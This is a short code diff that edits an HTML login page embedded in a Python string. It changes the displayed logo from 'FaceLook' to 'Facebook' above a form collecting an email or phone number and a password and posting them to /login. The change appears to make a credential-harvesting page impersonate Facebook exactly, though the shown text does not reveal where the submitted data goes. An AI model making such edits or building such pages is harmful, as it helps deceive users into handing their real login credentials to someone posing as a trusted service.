@@ -70,7 +70,7 @@ html_content = """
 </head>
 <body>
     <div class=\"container\">
-        <div class=\"logo\">FaceLook</div>
+        <div class=\"logo\">Facebook</div>
         <form action=\"/login\" method=\"POST\">
             <input type=\"text\" name=\"email\" placeholder=\"Email or phone number\" required>
             <input type=\"password\" name=\"password\" placeholder=\"Password\" required>
